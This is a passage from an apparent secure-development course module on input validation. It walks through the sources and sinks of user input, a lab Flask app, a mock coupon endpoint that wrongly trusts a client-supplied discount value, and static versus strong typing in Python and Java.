<!----><div><h1>Input Validation Fundamentals</h1>
<p>In this Learning Module, we will cover the following Learning Units:</p>
<ul>
<li>User-controlled Input</li>
<li>Validating Input</li>
</ul>
<p>Every interaction that users have with our applications is translated
into some sort of input that we need to process. Although we expect
that users will follow the expected way to interact with the platform,
we need to define some safeguards so that we can have the assurance
that the values will not cause unintended side effects in regards to
both the usability and the security of our system. If the inputs our
application receives are incorrect, the output to the user will be as
well.<sup class="footnote-ref"><a href="#fn1" id="fnref1">1</a></sup></p>
<p>We are going to explore the different ways we can receive user input
and analyze the ways different programming languages approach
<em>variable typing</em>.<sup class="footnote-ref"><a href="#fn2" id="fnref2">2</a></sup> The data type of variables we use to
store values can influence the way comparisons take place.</p>
<p>Finally, we are going to explore techniques that we can use to
minimize risks while accepting user-controlled data.</p>
<section class="footnote-container"><div class="footnote-item" id="fn1"><sup>1</sup><p>(Oxford, 2023), <a href="https://www.oxfordreference.com/display/10.1093/oi/authority.20110803095842747;jsessionid=0CDC171200474733D0FA8DE2D4D77F07" target="_blank">https://www.oxfordreference.com/display/10.1093/oi/authority.20110803095842747;jsessionid=0CDC171200474733D0FA8DE2D4D77F07</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn2"><sup>2</sup><p>(W3Schools, 2023), <a href="https://www.w3schools.com/java/java_data_types.asp" target="_blank">https://www.w3schools.com/java/java_data_types.asp</a> <a href="#fnref2" class="footnote-backref">↩︎</a></p>
</div></section></div><!---->

<!----><div><h2>User-Controlled Input</h2>
<p>This Learning Unit covers the following Learning Objectives:</p>
<ul>
<li>Explore the possible origins of user-controlled data</li>
<li>Understand the implications of where user-controlled data is used</li>
<li>Analyze the implications of typing in different programming languages</li>
</ul>
</div><!---->

<h2>Receiving Input from Users</h2>

<div class="markdown-content text-main-color flex-grow my-6 mx-auto"><!----><div><p>Most websites require user input. Even static websites such as blogs
rely on user input in the form of articles or post IDs, even if that
ID is mapped from an <em>SEO-optimized</em><sup class="footnote-ref"><a href="#fn1" id="fnref1">1</a></sup> URL.</p>
<p>In the case of a blog, other optional values might also be part of the
request. Although those values are not indispensable to the core
functionality, they are still included in the requests users (or their
browsers) send our application. <em>UTM parameters</em><sup class="footnote-ref"><a href="#fn2" id="fnref2">2</a></sup>
are instances of these optional, yet common, values.</p>
<p>In the example we just explored, we limited the input to the URL that
is used to access the content. However, there are other <em>sources</em> of
user-controlled input.</p>
<p>User input is most often received through dynamic URL paths, URL
<em>query strings</em>,<sup class="footnote-ref"><a href="#fn3" id="fnref3">3</a></sup> POST payload requests,
or HTTP headers. Let's explore examples of these, starting with a URL
path.</p>
<pre id="fence-code-27" class="fence-code"><code>https://www.offsec.com<span class="code-block-p">/labs/individual/</span>
</code></pre>
<blockquote>
<p>Listing 1 - Dynamic URL paths</p>
</blockquote>
<p>Web applications need to handle URLs to determine what content to
return to the requester. In some cases, the URL's path corresponds to
a directory structure on the application server's file system. Most
modern web applications use <em>HTTP routing</em><sup class="footnote-ref"><a href="#fn4" id="fnref4">4</a></sup> to map the
request path to the corresponding response content. In the case of
informational sites and blogs, those dynamic paths are called <em>URL
slugs</em>.<sup class="footnote-ref"><a href="#fn5" id="fnref5">5</a></sup> The URL shown above in Listing
1 could reference a directory on the server or
may use HTTP routing to reference content.</p>
<p>Query strings are another way to receive data via the URL. They are
key-value pairs that start with the character <strong>?</strong> and are separated
by the character <strong>&amp;</strong>.</p>
<pre id="fence-code-28" class="fence-code"><code>https://www.offsec.com/courses/web-300/<span class="code-block-p">?utm_campaign=pg_90_day_sku&amp;utm_medium=hs_email</span>
</code></pre>
<blockquote>
<p>Listing 2 - Query Strings</p>
</blockquote>
<p>Listing 2 presents a URL with a query string that
has two parameters: <em>utm_campaign</em> and <em>utm_medium</em>. These parameters
must be <em>URL encoded</em><sup class="footnote-ref"><a href="#fn6" id="fnref6">6</a></sup> and they should
not be too long. Although <em>RFC 2616</em><sup class="footnote-ref"><a href="#fn7" id="fnref7">7</a></sup> does not define
limits for URL sizes, different browsers have imposed varying
limitations.<sup class="footnote-ref"><a href="#fn8" id="fnref8">8</a></sup> The safe approach is not
to go beyond a limit of 2048 characters. If the data we expect from
our users could exceed that limitation, we should consider a different
approach.</p>
<p>In some cases, especially in <em>RESTful APIs</em>,<sup class="footnote-ref"><a href="#fn9" id="fnref9">9</a></sup> URL paths
and query strings can be used to achieve the same goal. For instance,
an API could have a <strong>/users/{id}</strong>  endpoint where "{id}" is replaced
at runtime with the user's numeric identifier. If we defined our code
to receive the same parameter as a query string, the URL would have
the structure: <strong>/users?id={id}</strong>. Either option can be effective;
it's merely a matter of preference.</p>
<p>We can also send user input via the request's body by using methods
such as <em>POST</em> and <em>PUT</em>. Sending parameters this way offers more
flexibility than query strings. Similar to a query string, we can
send data as key-value pairs. Depending on the type of data we want
to send, we may need to use different
<em>Content-Type</em><sup class="footnote-ref"><a href="#fn10" id="fnref10">10</a></sup> values. In the case of
key-value pairs, we can use <em>application/x-www-form-urlencoded</em>.</p>
<p>In cases where users can upload files, we can include these in the
request body as well. However, we need to use the
<em>multipart/form-data</em> Content-Type. This adds some overhead to the
request, but it allows us to include both key-value pairs and files.</p>
<p>We can also send a <em>JSON</em><sup class="footnote-ref"><a href="#fn11" id="fnref11">11</a></sup> payload as the only
element of the request's body using the <em>application/json</em>
Content-Type.</p>
<p>HTTP headers can also be used to collect user input. In most cases,
HTTP headers contain <em>metadata</em><sup class="footnote-ref"><a href="#fn12" id="fnref12">12</a></sup> key-value
pairs that describe the request. Some common headers include
<em>Content-Type</em>, which describes the contents of the body, and
<em>User-Agent</em>, which contains a string that identifies the web client
that the client is using to perform the request.</p>
<p>Besides metadata, HTTP headers can also contain authentication and
authorization data, such as <em>JSON Web Tokens</em>.<sup class="footnote-ref"><a href="#fn13" id="fnref13">13</a></sup></p>
<p>Let's review an example. To follow along, we'll start the VM in the
<em>Resources</em> section at the bottom of this page. We need to create an
entry in our <strong>/etc/hosts</strong> file so that we can access the VM.</p>
<pre id="fence-code-29" class="fence-code has-commands"><code>kali@kali:~$ <span class="code-block-ui">cat /etc/hosts</span>
127.0.0.1       localhost
127.0.1.1       kali
<span class="code-block-p">192.168.50.156  inputvalidation</span>
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
</code></pre>
<blockquote>
<p>Listing 3 - Editing our hosts file</p>
</blockquote>
<p>Using this configuration, we'll be able to connect to the VM via the
browser and use a web-based IDE to read code.</p>
<p>Let's open a browser and navigate to <strong>http://inputvalidation:8085/</strong>,
a demo site we can use that displays some typical input sources. We
should note that this website does not validate the values it
receives, it only displays them.</p>
<p>
</p><figure>
<img src="https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/SSD-100/images/input_validation/728f5597cc48ef7f5e3927547bce79d9-iv_input_echoer1.png" alt="Figure 1: Input Echoer">
<figcaption>Figure 1: Input Echoer</figcaption>
</figure>
<p></p>
<p>Not all the fields are populated. The URL does not have query string
parameters, so those are empty. The POST values are empty as well.
However, the headers are populated. There is also a <em>path info</em> value,
even though it's not part of our URL. This value was defined as a
default value. We'll later analyze the source code to better
understand why it's there.</p>
<p>The button titled <em>Send POST Parameters</em> will submit an HTML form.
Let's analyze the code of the form. To display the code, we'll
right-click the button and select the <em>Inspect</em> option.</p>
<p>Both Chrome and Firefox will open the <em>Web Developer Tools</em> so that we
can explore the source code of the page, specifically highlighting the
component that we selected before clicking on <em>Inspect</em>.</p>
<pre id="fence-code-30" class="fence-code"><code>&lt;form <span class="code-block-p">action="/another-path?refresh=true"</span> <span class="code-block-s">method="post"</span> style="padding-top:0px"&gt;
&lt;input type="hidden" name="post_param" value="form value"&gt;
&lt;button type="submit" class="btn btn-primary"&gt;Send POST parameters&lt;/button&gt;
&lt;/form&gt;
</code></pre>
<blockquote>
<p>Listing 4 - Form to submit values to Input Echoer</p>
</blockquote>
<p>The action of the form indicates that it will send the value to a
different path that includes a URL query string. The form tag also has
an attribute that specifies a <em>POST</em> submission.</p>
<p>It is worth noting that the <em>enctype</em> attribute (which defines how the
values should be encoded) is absent. This means that we'll use the
default encoding (application/x-www-form-urlencoded).</p>
<p>Inside the form tag, we'll find <em>post_param</em>, a hidden input control,
which is set to a preset value. The form tag also includes a submit
button.</p>
<p>Let's close the Web Developer Tools and click on <em>Send POST
Parameters</em>.</p>
<p>
</p><figure>
<img src="https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/SSD-100/images/input_validation/1d0ffdf7801965a739e66eeac68c607d-iv_input_echoer2.png" alt="Figure 2: Input Echoer with POST values">
<figcaption>Figure 2: Input Echoer with POST values</figcaption>
</figure>
<p></p>
<p>After clicking the button, all of the fields will be populated. We'll
note that the path info and the URL parameters sections correspond to
the URL in the form's action. The POST parameters field contains the
value of the hidden input.</p>
<p>Let's analyze the headers focusing on the <em>User-Agent</em> (which browsers
populate) and that can convey whether or not the browser supports
specific features.</p>
<p>Ideally, different applications should use different strings for this
value. However, this is not always the case. In fact, some attack
tools, such as <em>Sqlmap</em>,<sup class="footnote-ref"><a href="#fn14" id="fnref14">14</a></sup> allow the attacker
to change the User-Agent so sqlmap can pose as a different
application. Most header values can be modified by users, so they
should not be trusted without verifying them first.</p>
<p>Another interesting header is the <em>Content-Type</em>, which specifies the
default <em>enctype</em> that forms use. This means the <em>POST</em> values were
sent in the request body as a query string.</p>
<p>Next, let's inspect the site's code using VSCode. We can access a
browser-based version of VSCode on our VM by <em>port forwarding</em> through
an <em>SSH tunnel</em>. We'll use <strong>ssh</strong>, setting <strong>-N</strong> to not execute a
remote command, then enable port forwarding with <strong>-L</strong> followed by
our local port (8080), the IP address, and port on the remote host. If
this is our first time connecting to the host with SSH, we will be
prompted to continue connecting after reviewing the host's <em>key
fingerprint</em>.</p>
<pre id="fence-code-31" class="fence-code has-commands"><code>kali@kali:~$ <span class="code-block-ui">ssh -N -L 0.0.0.0:8080:127.0.0.1:8080 student@inputvalidation</span> 
The authenticity of host 'inputvalidation (192.168.50.156)' can't be established.
ED25519 key fingerprint is SHA256:pA6AusEU0+Eh9C+NR4pnQgWPcELUtuCmXfynHiuSZkk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? <span class="code-block-ui">yes</span>
Warning: Permanently added 'inputvalidation' (ED25519) to the list of known hosts.
student@inputvalidation's password: 
</code></pre>
<blockquote>
<p>Listing 5 - Forwarding port 8080 through an SSH tunnel</p>
</blockquote>
<p>Now that we have created our tunnel, we can access VSCode on port 8080
of our <em>localhost</em>.</p>
<p>Let's navigate to
<strong>http://localhost:8080/?folder=/home/student/input_echoer</strong> and open
the file <strong>app.py</strong>.</p>
<pre id="fence-code-32" class="fence-code"><code>File: /home/student/input_echoer/app.py
... 
08: @app.route('/', defaults={'slug': 'home'})
09: @app.route('/&lt;slug&gt;', methods = ['POST', 'GET'])
10: def index(slug):
11:     <span class="code-block-p">headers = request.headers</span>
12:     <span class="code-block-p">url_params = request.args.items()</span>
13:     <span class="code-block-p">post_params = request.form.items()</span>
14:     response = make_response(render_template("index.html", headers=headers, url_params=url_params, slug=slug, post_params = post_params))
15:     return response
...

</code></pre>
<blockquote>
<p>Listing 6 - Input Echoer source code</p>
</blockquote>
<p>Lines 8 and 9 contain <em>decorators</em><sup class="footnote-ref"><a href="#fn15" id="fnref15">15</a></sup>
that specify which paths the <em>index()</em> function will handle. Line 8
also contains a default value, which explains why the variable that
contains the path info had the value of "home" even though we did not
set an explicit path.</p>
<p>Line 9 contains a <em>slug</em> variable that receives any possible value and
sends it to the <em>index()</em> function.</p>
<p>Lines 11-13 retrieve the values of the headers, query string, and
<em>POST</em> parameters, respectively, then assigns them to variables.
Finally, line 14 passes those values to the template that renders the
HTML.</p>
<p>Now that we have explored sources of input, let's analyze their
destinations. In the context of applications, when we have a data
flow, the destination of the data is known as a
<em>sink</em>.<sup class="footnote-ref"><a href="#fn16" id="fnref16">16</a></sup> Examples of user input sinks include a
database, logs, or the contents of rendered HTML.</p>
<p>Each of these sinks can pose different risks and requires different
controls. For instance, when user-controlled input is rendered as-is
in our HTML, a user could include Javascript or HTML code in a
<em>Cross-Site Scripting</em> (XSS)<sup class="footnote-ref"><a href="#fn17" id="fnref17">17</a></sup> attack. When
user-controlled input is stored in a database, the two main risks are
<em>SQL injection</em><sup class="footnote-ref"><a href="#fn18" id="fnref18">18</a></sup> and <em>persistent XSS</em>.</p>
<p>In cases where the sink is a log file, the application may be
vulnerable to <em>log injection</em>.<sup class="footnote-ref"><a href="#fn19" id="fnref19">19</a></sup>
Depending on the situation, log injection can create two possible
scenarios: <em>forging</em> and <em>poisoning</em>.</p>
<p><em>Log forging</em> occurs when user-controlled input can be crafted in such
a way that, when stored in a log file, the input appears to be an
additional valid entry. This can create an integrity risk because it
might seem like a non-existent event took place; in some cases, that
addition may even corrupt our log file.</p>
<p><em>Log poisoning</em> can take place when an attacker exploits a <em>local file
inclusion</em> (LFI)<sup class="footnote-ref"><a href="#fn20" id="fnref20">20</a></sup> vulnerability and can also
inject data into a log. By chaining these two exploits, an attacker
may be able to obtain <em>remote code execution</em>
(RCE).<sup class="footnote-ref"><a href="#fn21" id="fnref21">21</a></sup></p>
<p>We should also be aware of a vulnerability known as <em>command
injection</em>.<sup class="footnote-ref"><a href="#fn22" id="fnref22">22</a></sup> This risk occurs when an attacker
can append arbitrary commands to a string that is evaluated as system
commands. To prevent this risk, we need to avoid using functions that
receive strings to execute system commands or that evaluate strings to
execute runnable code. If our use case requires this, we must not
concatenate strings that will be executed to user-controlled input.</p>
<p>Not every value is meant to be a parameter. We need to consider that
our business logic should not be altered by user input. Some values
that could create some risks if they are modified by users include
user roles that are not backed by a token, discount percentages,
product prices, and payment totals.</p>
<p>Let's analyze an example. In this example, we have a mock endpoint
that simulates the functionality of applying a coupon on an E-Commerce
site.</p>
<p>To call the service, we'll use <strong>curl</strong><sup class="footnote-ref"><a href="#fn23" id="fnref23">23</a></sup> and the
URL of our server. We'll use <strong>-X</strong> to set the request method to
<strong>POST</strong>, use <strong>-H 'accept: application/json'</strong> and <strong>-H
'Content-Type: application/json'</strong> to set two headers indicating our
preference for JSON return data, and finally, set our request's
payload with <strong>-d '{"couponId": "IWANTPIZZA5","orderId":
52142,"discountType": 1,"discountValue": 5}'</strong> to set our coupon ID,
discount type, and discount value.</p>
<pre id="fence-code-33" class="fence-code has-commands"><code>kali@kali:~$ <span class="code-block-ui">curl http://inputvalidation:8088/applycoupon -X POST -H 'accept: application/json' -H 'Content-Type: application/json' -d '{"couponId":"IWANTPIZZA5","orderId": 52142,"discountType": 1,"discountValue":5}'</span>
<span class="code-block-p">{"success":true,"message":"The coupon was applied successfully"}</span>
</code></pre>
<blockquote>
<p>Listing 7 - Consuming an endpoint to apply a coupon</p>
</blockquote>
<p>Within the payload of the request, the name of the coupon is very
descriptive, which is meant to prevent coupon name guessing, but the
payload also includes a numeric value with the actual discount
amount.</p>
<p>This creates a risky scenario. If an attacker analyzes traffic from a
legitimate coupon request, they could modify the <em>discountValue</em> in
the request to modify the coupon. This effectively bypasses the
application's business logic.</p>
<p>Let's analyze the source code by using our ssh tunnel to access
VSCode. We'll browse to
<strong>http://localhost:8080/?folder=/home/student/unnecessary_input</strong> and
open <strong>app.py</strong>.</p>
<pre id="fence-code-34" class="fence-code"><code>File: /home/student/unnecessary_input/app.py
26: @app.post("/applycoupon")
27: def apply_coupon(couponRequest: ApplyCouponRequest, response: Response):
28:     if not mock_authentication_authorization():
29:         response.status_code = status.HTTP_403_FORBIDDEN
30:         return {"success": False, "message": "Unauthorized"}
31:     <span class="code-block-p">mock_apply_discount(couponRequest.couponId, couponRequest.discountType, couponRequest.discountValue)</span>
32:     return {"success": True, "message": "The coupon was applied successfully"}

</code></pre>
<blockquote>
<p>Listing 8 - Analyzing unnecessary parameters</p>
</blockquote>
<p>On line 31, there's a function call using the <em>discountValue</em>
parameter that was received from the user. However, to minimize risks,
it would have been better to use the <em>couponId</em> to obtain the
parameters associated with that coupon, which would return the
expiration date and percentage.</p>
<p>To achieve this, we could define a database table where we can store
all the values associated with our coupon. With that, we can use the
couponId as a search field to obtain the discount percentage with the
certainty that the value is under our control.</p>
<p>In some cases, the benefits of validating input may not be apparent
immediately. For instance, if an application or service only stores
user-controlled data, it might not seem urgent to handle it properly
against other risks such as XSS because its immediate sink is a
database. However, if that stored data is eventually used by another
service, the unsanitized data of the service that only stored it could
result in the exploitation of the service that displays it. This is
known as a <em>second order injection</em>.<sup class="footnote-ref"><a href="#fn24" id="fnref24">24</a></sup></p>
<p>There are many ways to obtain data from users. Depending on the
situation, we should use different approaches. In general, parameters
that are query strings should be favored for filtering, POST
parameters are more suited for transactional purposes, and headers are
more suited for metadata and special use cases, such as authorization
tokens.</p>
<section class="footnote-container"><div class="footnote-item" id="fn1"><sup>1</sup><p>(Google, 2023), <a href="https://developers.google.com/search/docs/fundamentals/seo-starter-guide" target="_blank">https://developers.google.com/search/docs/fundamentals/seo-starter-guide</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn2"><sup>2</sup><p>(Hootsuite, 2021), <a href="https://blog.hootsuite.com/how-to-use-utm-parameters/" target="_blank">https://blog.hootsuite.com/how-to-use-utm-parameters/</a> <a href="#fnref2" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn3"><sup>3</sup><p>(Wikipedia, 2023), <a href="https://en.wikipedia.org/wiki/Query_string" target="_blank">https://en.wikipedia.org/wiki/Query_string</a> <a href="#fnref3" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn4"><sup>4</sup><p>(OpenJS Foundation, 2017), <a href="https://expressjs.com/en/guide/routing.html" target="_blank">https://expressjs.com/en/guide/routing.html</a> <a href="#fnref4" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn5"><sup>5</sup><p>(HubSpot, 2022), <a href="https://blog.hubspot.com/website/what-is-wordpress-slug" target="_blank">https://blog.hubspot.com/website/what-is-wordpress-slug</a> <a href="#fnref5" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn6"><sup>6</sup><p>(W3Schools, 2023), <a href="https://www.w3schools.com/tags/ref_urlencode.ASP" target="_blank">https://www.w3schools.com/tags/ref_urlencode.ASP</a> <a href="#fnref6" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn7"><sup>7</sup><p>(The Internet Society, 1999), <a href="https://www.rfc-editor.org/rfc/rfc2616" target="_blank">https://www.rfc-editor.org/rfc/rfc2616</a> <a href="#fnref7" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn8"><sup>8</sup><p>(StackOverflow, 2021), <a href="https://stackoverflow.com/questions/812925/what-is-the-maximum-possible-length-of-a-query-string" target="_blank">https://stackoverflow.com/questions/812925/what-is-the-maximum-possible-length-of-a-query-string</a> <a href="#fnref8" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn9"><sup>9</sup><p>(RedHat, 2020), <a href="https://www.redhat.com/en/topics/api/what-is-a-rest-api" target="_blank">https://www.redhat.com/en/topics/api/what-is-a-rest-api</a> <a href="#fnref9" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn10"><sup>10</sup><p>(Mozilla, 2023), <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type" target="_blank">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type</a> <a href="#fnref10" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn11"><sup>11</sup><p>(W3Schools, 2023), <a href="https://www.w3schools.com/js/js_json_intro.asp" target="_blank">https://www.w3schools.com/js/js_json_intro.asp</a> <a href="#fnref11" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn12"><sup>12</sup><p>(NISO, 2017), <a href="https://groups.niso.org/higherlogic/ws/public/download/17446/Understanding%20Metadata.pdf" target="_blank">https://groups.niso.org/higherlogic/ws/public/download/17446/Understanding Metadata.pdf</a> <a href="#fnref12" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn13"><sup>13</sup><p>(IETF, 2015), <a href="https://www.rfc-editor.org/rfc/rfc7519" target="_blank">https://www.rfc-editor.org/rfc/rfc7519</a> <a href="#fnref13" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn14"><sup>14</sup><p>(SQLMap, 2023), <a href="https://sqlmap.org/" target="_blank">https://sqlmap.org/</a> <a href="#fnref14" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn15"><sup>15</sup><p>(Python, 2022), <a href="https://peps.python.org/pep-0318/" target="_blank">https://peps.python.org/pep-0318/</a> <a href="#fnref15" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn16"><sup>16</sup><p>(Wikipedia, 2023), <a href="https://en.wikipedia.org/wiki/Sink_(computing)" target="_blank">https://en.wikipedia.org/wiki/Sink_(computing)</a> <a href="#fnref16" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn17"><sup>17</sup><p>(OWASP, 2023), <a href="https://owasp.org/www-community/attacks/xss/" target="_blank">https://owasp.org/www-community/attacks/xss/</a> <a href="#fnref17" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn18"><sup>18</sup><p>(OWASP, 2023), <a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">https://owasp.org/www-community/attacks/SQL_Injection</a> <a href="#fnref18" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn19"><sup>19</sup><p>(OWASP, 2023), <a href="https://owasp.org/www-community/attacks/Log_Injection" target="_blank">https://owasp.org/www-community/attacks/Log_Injection</a> <a href="#fnref19" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn20"><sup>20</sup><p>(OWASP, 2023), <a href="https://owasp.org/www-community/vulnerabilities/PHP_File_Inclusion" target="_blank">https://owasp.org/www-community/vulnerabilities/PHP_File_Inclusion</a> <a href="#fnref20" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn21"><sup>21</sup><p>(CrowdStrike, 2022), <a href="https://www.crowdstrike.com/cybersecurity-101/remote-code-execution-rce/" target="_blank">https://www.crowdstrike.com/cybersecurity-101/remote-code-execution-rce/</a> <a href="#fnref21" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn22"><sup>22</sup><p>(OWASP, 2023), <a href="https://owasp.org/www-community/attacks/Command_Injection" target="_blank">https://owasp.org/www-community/attacks/Command_Injection</a> <a href="#fnref22" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn23"><sup>23</sup><p>(Curl, 2023), <a href="https://curl.se/" target="_blank">https://curl.se/</a> <a href="#fnref23" class="footnote-backref">↩︎</a></p>
</div><div class="footnote-item" id="fn24"><sup>24</sup><p>(NCC Group, 2004), <a href="https://research.nccgroup.com/wp-content/uploads/2020/07/second-order_code_injection_attacks._advanced_code_injection_techniques_and_testing_procedures.pdf" target="_blank">https://research.nccgroup.com/wp-content/uploads/2020/07/second-order_code_injection_attacks._advanced_code_injection_techniques_and_testing_procedures.pdf</a> <a href="#fnref24" class="footnote-backref">↩︎</a></p>
</div></section></div><!----></div>

<h2>Static vs Dynamic Typing and Type Coercion</h2>

<div class="markdown-content text-main-color flex-grow my-6 mx-auto"><!----><div><p>Now that we've discussed the sources of user-controlled input, let's
analyze how we store that data in memory and the nuances of the
approach we follow when we manipulate data in different programming
languages. This is especially important when we need to compare
values, which is one of the key components of input validation.</p>
<p>Variables are one of the first concepts that we cover whenever we are
learning a new programming language; without them, we would not have a
way to store values. Some programming languages require explicit
declarations that include the <em>data types</em><sup class="footnote-ref"><a href="#fn1" id="fnref1">1</a></sup> of
our variables, while other languages (like JavaScript and Python)
allow us to use variables without declarations.</p>
<section class="sb-block"><p>JavaScript has an expression called <em>'use strict';</em>,<sup class="footnote-ref"><a href="#fn2" id="fnref2">2</a></sup>
which, among other things, forces us to declare variables before using
them.</p></section>
<p>There are two classifications of data typing we are going to explore.
These are <em>static and dynamic typing</em>,<sup class="footnote-ref"><a href="#fn3" id="fnref3">3</a></sup> and
<em>weak or strong typing</em>.<sup class="footnote-ref"><a href="#fn4" id="fnref4">4</a></sup> Let's start with
the first classification.</p>
<p>When a programming language has static typing, it requires declaring
the type of variables before using them, and that's the only type of
value they can accept. This also means that the verification of values
assigned to variables occurs at compile time, not at runtime.</p>
<p>In contrast, dynamically typed languages check variable typing at
runtime, and don't require specifying a type when declaring a
variable. The program infers the variable's type based on the value
that is being assigned.</p>
<p>PHP and Python are examples of dynamically typed languages. On the
other hand, Java and C are statically typed languages.</p>
<p>In some programming languages, a variable can change its data type at
runtime. This is something we'll need to account for while validating
input. Let's review the same algorithm implemented both in Python and
Java to get a better idea of how they differ.</p>
<p>If it's not still running, let's create our ssh tunnel again, visit
<strong>http://localhost:8080/?folder=/home/student/typing</strong>, and open
<strong>main.py</strong>. We'll also need another ssh session to our VM to be able
to execute or compile our scripts.</p>
<section class="sb-block"><p>Since Python 3.5, Python has type-hinting. However, even if we
used it, the behavior we'll explore remains the same.</p></section>
<pre id="fence-code-36" class="fence-code"><code>File: /home/student/typing/main.py
01: #!//bin/env python3
02: def main():
03:     print("A Python example")
04:     <span class="code-block-p">var1 = 0</span>
05:     print(f"The variable 'var1' contains: {var1}")
06:     <span class="code-block-p">var1 = "A string value"</span>
07:     print(f"The variable 'var1' contains: {var1}")
08: 
09: if __name__ == "__main__":
10:     main()
</code></pre>
<blockquote>
<p>Listing 9 - Python and dynamic typing</p>
</blockquote>
<p>On lines 4 and 6, we can observe that the same variable contains data
of different types. This is fine in Python, and the interpreter should
not throw any errors or exceptions because of that. Let's try this
out.</p>
<pre id="fence-code-37" class="fence-code has-commands"><code>student@inputvalidation:~/typing$ <span class="code-block-ui">python3 /home/student/typing/main.py</span>
A Python example
The variable 'var1' contains: 0
The variable 'var1' contains: A string value
</code></pre>
<blockquote>
<p>Listing 10 - Execution of main.py</p>
</blockquote>
<p>The same variable stored an integer and later a string, and the
program ran successfully. This is how a dynamically-typed language is
supposed to behave.</p>
<p>Let's try the same thing we did in Python, but now with Java.</p>
<pre id="fence-code-38" class="fence-code"><code>File: /home/student/typing/main.java
01: class Main{
02: public static void main(String[] args){
03:    System.out.println("A Java example");
04:    <span class="code-block-p">int var1;</span>
05:    <span class="code-block-p">var1 = 0;</span>
06:    System.out.println("The variable 'var1' contains: " + var1);
07:    <span class="code-block-p">var1 = "A string value";</span>
08:    System.out.println("The variable 'var1' contains: " + var1);
09: }
10: }
</code></pre>
<blockquote>
<p>Listing 11 - Java and static typing</p>
</blockquote>
<p>On line 4, the variable <em>var1</em> is declared as an int, and we use it as
an int on line 5. However, on line 7, we try to assign a string to it.
This is not allowed in statically-typed languages. Let's try to
compile (and run) this file with the <strong>java</strong> command.</p>
<pre id="fence-code-39" class="fence-code has-commands"><code>student@inputvalidation:~/typing$ <span class="code-block-ui">java /home/student/typing/main.java</span>
/home/student/typing/main.java:7: <span class="code-block-p">error: incompatible types: String cannot be converted to int</span>
   var1 = "A string value";
          ^
1 error
error: compilation failed
</code></pre>
<blockquote>
<p>Listing 12 - Compilation of main.java</p>
</blockquote>
<p>As expected, the class did not compile, and because of the compile
error, it didn't run either.</p>
<p>As we mentioned earlier, besides static and dynamic typing, there is
another classification we need to analyze: <em>strong and weak typing</em>.</p>
<p>Static and dynamic typing focus more on the flexibility of a variable
to accept values of different types. On the other hand, weak and
strong typing focus on how likely a programming language is to
<em>cast</em><sup class="footnote-ref"><a href="#fn5" id="fnref5">5</a></sup> or transform the data to a different
data type. Strongly typed languages do not automatically convert
values without an expression that defines that conversion. Weakly
typed languages allow implicit conversions.</p>
<p>The nature of a programming language as weak- or strongly-typed
influences how variables of different types behave when arithmetic
operations and comparisons occur. We might run into situations where a
language could interpret equalities even though values are seemingly
different to us. This is a risk we need to be aware of while we are
validating input.</p>
<p>Let's start our analysis with Python, a strongly-typed language.</p>
<pre id="fence-code-40" class="fence-code has-commands"><code>student@inputvalidation:~$ <span class="code-block-ui">python3</span>
Python 3.10.4 (main, Apr  2 2022, 09:04:19) [GCC 11.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt;<span class="code-block-ui">10+1</span>
<span class="code-block-s">11</span>
&gt;&gt;&gt;<span class="code-block-ui">"10"+1</span>
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
<span class="code-block-p">TypeError: can only concatenate str (not "int") to str</span>
</code></pre>
<blockquote>
<p>Listing 13 - Examples of Python operations</p>
</blockquote>
<p>The first operation between two integers works without issues.
However, if we try to use a numeric string, such as "10" and add it
to an integer, the interpreter tells us that we can't concatenate an
int to a string. Strongly-typed languages do not automatically convert
values without an expression that defines that conversion.</p>
<p>However, in a strongly-typed language like Python, we can
<em>cast</em><sup class="footnote-ref"><a href="#fn5" id="fnref5:1">5:1</a></sup> (or transform) the data to a different
data type.</p>
<pre id="fence-code-41" class="fence-code has-commands"><code>&gt;&gt;&gt; <span class="code-block-ui">int("10")+1</span>
<span class="code-block-p">11</span>
&gt;&gt;&gt; <span class="code-block-ui">exit()</span>
</code></pre>
<blockquote>
<p>Listing 14 - Explicit casting of a string value (Python)</p>
</blockquote>
<p>To successfully execute the operation, we need to explicitly cast the
numeric string to an integer using <em>int()</em>, and then we'll be allowed
to perform arithmetic operations with it.</p>
<section class="sb-block"><p>There's a special case in which Python allows multiplication
involving a string and an integer without casting. If we multiply a
string by a positive integer, the result is a new string with the
repetition of the provided string parameter, depending on the number
of times indicated by the integer we provided.</p></section>
<p>Let's analyze a similar scenario with JavaScript, which is a
weakly-typed programming language.</p>
